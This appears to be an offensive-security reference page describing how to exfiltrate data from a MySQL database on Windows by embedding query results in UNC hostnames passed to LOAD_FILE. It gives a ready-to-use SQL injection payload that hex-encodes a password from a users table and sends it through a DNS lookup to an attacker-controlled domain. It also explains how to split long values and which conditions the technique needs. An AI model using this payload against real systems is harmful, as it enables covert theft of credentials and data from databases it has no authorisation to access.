---
title: "DNS exfiltration from MySQL via LOAD_FILE UNC paths"
description: "Encoding MySQL query results into a UNC hostname so the Windows host's DNS lookup delivers the data to an attacker-controlled name server."
keywords:
  - DNS exfiltration
  - LOAD_FILE UNC
  - MySQL Windows exfiltration
  - blind data exfiltration
---

# DNS exfiltration

On Windows, `LOAD_FILE('\\host\share\file')` makes MySQL resolve `host` before connecting. If `host` is a subdomain of a domain whose name server the attacker runs, the lookup itself carries data: put the value to steal into the hostname and read it from the DNS query log. This turns a fully blind injection into a readable channel in a single request per value.

The value must be DNS-safe, so hex-encode it, and keep each label under 63 characters:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.tld\\x')),NULL,NULL-- 
```

When MySQL resolves `<hexpassword>.attacker.tld`, the authoritative name server for `attacker.tld` receives the full label and logs it, revealing the password after decoding the hex. Long values that exceed the label limit are split across several lookups with `SUBSTRING`.

This requires the `FILE` privilege, a Windows host, and a `secure_file_priv` that does not forbid `LOAD_FILE`. Because it needs no reflected output at all, it is the fastest channel against an otherwise blind Windows target, often paired with a tool like Burp Collaborator acting as the logging name server.

## References

- MySQL Reference Manual: LOAD_FILE, HEX, CONCAT
- OWASP Testing Guide: Testing for SQL Injection
